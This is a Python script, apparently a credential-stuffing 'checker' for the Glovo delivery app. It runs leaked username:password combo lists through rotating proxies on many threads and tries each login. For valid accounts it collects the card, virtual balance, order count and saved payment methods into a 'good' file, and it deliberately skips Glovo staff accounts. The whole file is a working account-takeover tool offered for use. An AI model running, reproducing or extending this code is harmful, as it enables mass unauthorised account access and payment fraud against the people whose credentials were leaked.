import random, threading, itertools

from concurrent.futures import ThreadPoolExecutor, as_completed

from modules.glovo import Glovo
from modules.console import Console, Clrs, get_fg_color, lock
from modules.utilities import config, json_to_string, format_proxy, get_lines


failed_lock = threading.Lock()
good_lock = threading.Lock()

def handle_failure(function_name: str, name: str, password: str, response, custom_reason: str = None, save: bool = True):
    if save:
        with failed_lock:
            with open('output/failed.txt', 'a') as f:
                f.write(f'{name}:{password}\n')
    if custom_reason is None:
        if type(response) == str:
            Console.error(f'glovo.{function_name}', f'Msg: {response}')
        else:
            Console.error(f'glovo.{function_name}', f'Status Code: {response.status_code}')
    else:
        Console.error(f'glovo.{function_name}', str(custom_reason))
        
def check_account(name: str, password: str, proxy: str = None):
    glovo = Glovo(proxy)

    success, response = glovo.index()
    if not success:
        handle_failure('index', name, password, response)
        return False
    
    success, response = glovo.identity_devices()
    if not success:
        handle_failure('identity_devices', name, password, response)
        return False
    
    success, response = glovo.get_auth_methods(name)
    if not success:
        handle_failure('get_auth_methods', name, password, response)
        return False
    if b'PASSWORD' not in response.content:
        handle_failure('get_auth_methods', name, password, response, 'Password not supported.')
        return False
    
    success, response = glovo.get_auth_token(name, password)
    if not success:
        handle_failure('get_auth_token', name, password, response)
        return False
    data = response.json()
    if data.get('access') and config['console']['debug']:
        Console.information('glovo.get_auth_token', 'Token generated successfully.')
    elif data.get('error'):
        handle_failure('get_auth_token', name, password, response, f"Message: {data['error'].get('message', 'Unknown')}", False)
        return False
    glovo.access_token = data['access']['accessToken']
    
    success, response = glovo.get_user_info()
    if not success:
        handle_failure('get_user_info', name, password, response)
        return False
    user_info = response.json()
    if not user_info.get('virtualBalance'):
        handle_failure('get_user_info', name, password, response, 'Virtual balance not found.')
        return False
    essential_info = {
        'Current Card': str(user_info['currentCard']),
        'Virtual Balance': str(user_info['virtualBalance']['balance']),
        'Orders Count': str(user_info['deliveredOrdersCount']),
        'Payment Method': str(user_info['paymentMethod']),
        'Payment Way': str(user_info['paymentWay'])
    }
    
    success, response = glovo.get_payment_methods()
    if not success:
        handle_failure('get_payment_methods', name, password, response)
        return False
    payment_methods = response.json()['paymentMethods']
    if len(payment_methods) > 0:
        for payment_method in payment_methods:
            try:
                if payment_method['type'] == 'Cash':
                    continue
                _type = payment_method['type']
                payment_method.pop('image')
                payment_method.pop('type')
                payment_method.pop('isDefault')
                essential_info[_type] = payment_method
            except:
                print(payment_methods)
    with good_lock:
        with open('output/good.txt', 'a') as f:
            f.write(f'{name}:{password}:{json_to_string(essential_info)}\n')
    Console.checker(
        'Logged in!',
        f'{get_fg_color(7, 164, 130)}Name{Clrs.gray}: {get_fg_color(251, 196, 68)}{name} {Clrs.gray}| {get_fg_color(7, 164, 130)}Password{Clrs.gray}: {get_fg_color(251, 196, 68)}{password}{Clrs.reset}',
        True
    )
    for key, value in essential_info.items():
        with lock:
            print(f'   {get_fg_color(7, 164, 130)}{key}{Clrs.gray}: {get_fg_color(251, 196, 68)}{value}{Clrs.reset}')

threads = int(Console.input('Threads'))

proxies = get_lines('input/proxies.txt')
random.shuffle(proxies)
proxies = itertools.cycle(proxies)

combos = get_lines('input/combos.txt')
random.shuffle(combos)

with ThreadPoolExecutor(max_workers=threads) as executor:
    futures = []
    for line in combos:

        success, proxy = format_proxy(next(proxies))
        if not success:
            Console.error('Unsupported proxy format. (Use: user:pass@ip:port)', str(proxy))
            exit(-1)
            
        if line.count(':') > 1: # Some password contains ':'
            continue
        name = line.split(':')[0]
        password = line.split(':')[1]
        if 'glovo' in name and '@' in name: # Skip glovo/manager accounts
            continue
        futures.append(executor.submit(check_account, name, password, proxy))
        
    for future in as_completed(futures):
        future.result(60 * 2)